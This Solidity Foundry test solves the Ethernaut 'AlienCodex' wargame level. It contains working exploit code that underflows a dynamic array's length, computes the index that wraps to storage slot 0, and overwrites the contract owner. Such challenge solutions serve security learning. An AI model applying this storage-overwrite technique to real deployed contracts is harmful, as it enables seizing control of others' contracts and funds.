// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/19-AlienCodex/AlienCodexFactory.sol";
import "../src/Ethernaut.sol";

contract AlienCodexTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 1 ether);
    }

    function testAlienCodexHack() public {
        // Level Setup
        AlienCodexFactory alienCodexFactory = new AlienCodexFactory();
        ethernaut.registerLevel(alienCodexFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance(alienCodexFactory);
        IAlienCodex ethernautAlienCodex = IAlienCodex(payable(levelAddress));
        emit log_named_address("Initial Alien Contract Owner", ethernautAlienCodex.owner());
        emit log_named_address("Player", playerAddress);

        // Level Attack
        /* AlienCodex storage analysis:
        Slot[0] - owner + contact
        Slot[1] - codex.length
        Slot[2] - empty
        (...)
        Slot[keccak256(1)]     - array codex[0]
        Slot[keccak256(1) + 1] - array codex[1]
        Slot[keccak256(1) + 2] - array codex[2]
        (...)
        In solidity 0.5.x, the length is not read only, this means length can be underflowed
        By going to the last slot of the codex array Slot[2^256 - 1] and adding 1 we circle back to the beginning of the contract storage
        Slot[0] = Slot[2^256 - 1 + 1]
        */
        
        ethernautAlienCodex.make_contact();
        ethernautAlienCodex.retract();  // length = 2^256 - 1 --> last array position
        uint index = (2**256 - 1) - uint(keccak256(abi.encode(1))) + 1; // moving to storage slot[0]
        ethernautAlienCodex.revise(index, bytes32(abi.encode(playerAddress))); // Replacing contract owner with playerAddress
        emit log_named_address("Alien Contract Owner", ethernautAlienCodex.owner());

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}